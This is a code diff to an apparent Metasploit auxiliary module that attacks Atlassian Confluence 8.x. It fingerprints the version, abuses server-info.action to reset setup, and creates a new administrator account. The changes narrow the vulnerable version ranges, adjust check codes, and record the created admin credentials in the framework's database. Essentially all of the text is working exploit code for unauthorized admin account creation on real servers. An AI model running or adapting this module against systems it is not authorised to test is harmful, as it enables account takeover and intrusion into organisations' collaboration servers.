@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('TARGETURI', [true, 'Base path', '/']),
       OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
       OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
-      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', 'admin_1337@localhost.com'])
+      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])
     ])
   end
 
@@ -53,24 +53,23 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, '/login.action')
     )
-    return nil unless res&.code == 200
+    return Exploit::CheckCode::Unknown unless res
+    return Exploit::CheckCode::Safe unless res.code == 200
 
     poweredby = res.get_xml_document.xpath('//ul[@id="poweredby"]/li[@class="print-only"]/text()').first&.text
-    return nil unless poweredby =~ /Confluence (\d+(\.\d+)*)/
+    return Exploit::CheckCode::Safe unless poweredby =~ /Confluence (\d+(\.\d+)*)/
 
     confluence_version = Rex::Version.new(Regexp.last_match(1))
 
-    return Exploit::CheckCode::Unknown unless confluence_version
-
     vprint_status("Detected Confluence version: #{confluence_version}")
 
-    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.3')) ||
-       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.3')) ||
-       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.2'))
+    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.2')) ||
+       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.2')) ||
+       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.1'))
       return Exploit::CheckCode::Appears("Exploitable version of Confluence: #{confluence_version}")
     end
 
-    Exploit::CheckCode::Appears("Confluence version: #{confluence_version}")
+    Exploit::CheckCode::Safe("Confluence version: #{confluence_version}")
   end
 
   def run
@@ -84,9 +83,9 @@ class MetasploitModule < Msf::Auxiliary
 
     return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Version vulnerable but setup is already completed') unless res&.code == 302 || res&.code == 200
 
-    print_good('Found server-info.action ! Trying to ignore setup.')
+    print_good('Found server-info.action! Trying to ignore setup.')
 
-    create_admin_user
+    created_user = create_admin_user
 
     res = send_request_cgi(
       'method' => 'POST',
@@ -95,11 +94,27 @@ class MetasploitModule < Msf::Auxiliary
         'X-Atlassian-Token' => 'no-check'
       }
     )
+    
+    return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless created_user
 
-    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Admin user was created but setup could not be completed.') unless res&.code == 200
+    print_warning('Admin user was created but setup could not be completed.') unless res&.code == 200
 
+    create_credential({
+      workspace_id: myworkspace_id,
+      origin_type: :service,
+      module_fullname: fullname,
+      username: datastore['NEW_USERNAME'],
+      private_type: :password,
+      private_data: datastore['NEW_PASSWORD'],
+      service_name: 'Atlassian Confluence',
+      address: datastore['RHOST'],
+      port: datastore['RPORT'],
+      protocol: 'tcp',
+      status: Metasploit::Model::Login::Status::UNTRIED
+    })
+      
     print_good("Admin user was created successfully. Credentials: #{datastore['NEW_USERNAME']} - #{datastore['NEW_PASSWORD']}")
-    print_good("Now you can login as adminstrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action")
+    print_good("Now you can login as administrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action")
   end
 
   def create_admin_user
@@ -118,9 +133,6 @@ class MetasploitModule < Msf::Auxiliary
         'setup-next-button' => 'Next'
       }
     )
-
-    return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless res&.code == 302
-
-    print_good('Setup reverted back to the beginning. Attempting to create new admin user!')
+    res&.code == 302
   end
 end
